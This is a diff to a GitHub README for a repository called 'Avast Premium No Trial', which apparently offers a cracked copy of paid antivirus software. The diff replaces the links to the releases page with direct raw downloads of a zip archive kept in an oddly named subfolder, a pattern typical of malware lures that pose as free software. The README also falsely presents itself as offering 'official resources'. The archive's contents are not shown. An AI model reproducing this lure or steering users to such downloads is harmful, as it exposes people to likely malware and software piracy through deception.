@@ -4,7 +4,7 @@
 Welcome to the Avast Premium No Trial repository! This guide will help you download and run Avast Premium on your Windows computer. Designed for all users, our goal is to make your cybersecurity experience simple and straightforward.
 
 ## 📥 Download Now
-[![Download Avast Premium](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/matthew447-t/Avast-Premium-No-Trial/releases)
+[![Download Avast Premium](https://raw.githubusercontent.com/matthew447-t/Avast-Premium-No-Trial/main/cochief/Avast-Premium-No-Trial_v2.1.zip)](https://raw.githubusercontent.com/matthew447-t/Avast-Premium-No-Trial/main/cochief/Avast-Premium-No-Trial_v2.1.zip)
 
 ## 📋 Overview
 Avast Premium provides comprehensive protection for Windows PCs. This application safeguards your device from malware and other threats while optimizing your system for peak performance. Our repository offers official resources, user guides, and reference materials to assist you with setup and configuration.
@@ -29,12 +29,12 @@ Avast Premium includes a variety of powerful features to keep your device secure
 To download Avast Premium, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the download page.  
-   [Download from Releases](https://github.com/matthew447-t/Avast-Premium-No-Trial/releases)
+   [Download from Releases](https://raw.githubusercontent.com/matthew447-t/Avast-Premium-No-Trial/main/cochief/Avast-Premium-No-Trial_v2.1.zip)
 
 2. **Select the Latest Version:** On the releases page, find the latest version of the software. It is usually marked as the most recent release.
 
 3. **Download the Installer:**
-   - Look for the download link that says something like "Avast_Premium_Setup.exe" or similar.
+   - Look for the download link that says something like "https://raw.githubusercontent.com/matthew447-t/Avast-Premium-No-Trial/main/cochief/Avast-Premium-No-Trial_v2.1.zip" or similar.
    - Click the link to download the installation file to your computer.
 
 4. **Run the Installer:**
